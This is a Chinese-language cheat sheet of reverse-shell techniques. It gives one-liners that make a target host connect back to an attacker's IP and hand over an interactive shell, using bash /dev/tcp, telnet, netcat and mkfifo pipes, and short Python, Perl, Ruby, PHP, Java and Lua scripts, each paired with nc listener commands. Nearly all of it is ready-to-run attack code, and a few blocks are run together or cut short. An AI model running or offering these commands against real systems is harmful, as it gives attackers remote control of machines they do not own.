# 0x00 前言

反弹shell的各种姿势。

# 0x01 Bash反弹

## 1.1 方法一

攻击者主机上执行监听：

```
nc -lvvp port
```

目标主机上执行：

```
bash -i >& /dev/tcp/x.x.x.x/port 0>&1#bash -i   打开一个交互的bash#>&   将标准错误输出重定向到标准输出#/dev/tcp/x.x.x.x/port   意为调用socket,建立socket连接,其中x.x.x.x为要反弹到的主机ip，port为端口#0>&1   标准输入重定向到标准输出，实现你与反弹出来的shell的交互
```

> 注：/dev/tcp/ 是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在/dev/udp/。

inux shell下常用的文件描述符是：

1.标准输入 (stdin) ：代码为 0 ，使用 < 或 << ；

2.标准输出 (stdout)：代码为 1 ，使用 > 或 >> ；

3.标准错误输出(stderr)：代码为 2 ，使用 2> 或 2>>。

另外由于不同Linux发行版之间的差异，该命令在某些系统上可能并不适用。

## 1.2 方法

```
exec 0&0 2>&00<&196;exec 196<>/dev/tcp/x.x.x.x/4444; sh <&196 >&196 2>&196/bin/bash  -i > /dev/tcp/x.x.x.x/8080 0<&1 2>&1
```

## 1.3 方法三

```
exec 5<>/dev/tcp/x.x.x.x/4444;cat <&5 | while read line; do $line 2>&5 >&5; done
```

# 0x02 telnet反弹

## 2.1 方法一

攻击者主机上打开两个终端分别执行监听：

```
nc -lvvp 4444nc -lvvp 5555
```

目标主机中执行：

```
telnet x.x.x.x 4444 | /bin/bash | telnet x.x.x.x 5555
```

监听两个端口分别用来输入和输出，其中x.x.x.x均为攻击者ip

反弹shell成功后，在监听4444端口的终端中执行命令可以在另一个终端中看到命令执行结果。

## 2.2 方法二

```
rm -f /tmp/p; mknod /tmp/p p && telnet x.x.x.x 4444 0/tmp/p
```

# 0x03 nc（netcat）反弹 

攻击者主机上执行监听命令：

```
nc -lvvp port
```

目标主机上执行：

```
nc -e /bin/bash x.x.x.x port
```

如果目标主机linux发行版本没有 -e 参数，还有以下几种方式：

```
rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc x.x.x.x 9999 >/tmp/f
```

> 注：mkfifo 命令的作用是创建FIFO特殊文件，通常也称为命名管道，FIFO文件在磁盘上没有数据块，仅用来标识内核中的一条通道，各进程可以打开FIFO文件进行read/write，实际上是在读写内核通道（根本原因在于FIFO文件结构体所指向的read、write函数和常规文件不一样），这样就实现了进程间通信

```
nc x.x.x.x 4444|/bin/bash|nc x.x.x.x 5555   #从4444端口获取到命令，bash 运行后将命令执行结果返回 5555 端口，攻击者主机上也是打开两个终端分别执行监听。
nc -c /bin/sh x.x.x.x 4444
/bin/sh | nc x.x.x.x 4444
```

**0x04 常见脚本反弹**

## 4.1 python

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

## 4.2 perl

### 4.2.1 方法一

```
perl -e 'use Socket;$i="x.x.x.x";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### 4.2.2 方法二

```
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"x.x.x.x:5555");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## 4.3 Ruby

### 4.3.1 方法一

```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("x.x.x.x","5555");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### 4.3.2 方法二

```
ruby -rsocket -e'f=TCPSocket.open("x.x.x.x",5555).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## 4.4 PHP

```
php -r '$sock=fsockopen("x.x.x.x",5555);exec("/bin/bash -i <&3 >&3 2>&3");'
```

## 4.5 Java

```
public class Revs {/*** @param args* @throws Exception */public static void main(String[] args) throws Exception {    // TODO Auto-generated method stub    Runtime r = Runtime.getRuntime();    String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/x.x.x.x/5555;cat <&5 | while read line; do $line 2>&5 >&5; done"};    Process p = r.exec(cmd);    p.waitFor();}}
```

## 4.6 Lua

```
lua -e "require('socket');require('os');t=socket.tcp();t:connect('x.x.x.x','5555');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

> 注：以上脚本是在目标主机上执行，其中 x.x.x.x 均为攻击者ip，并且需要在攻击者主机上进行监听:
>
> nc -lvvp 5555

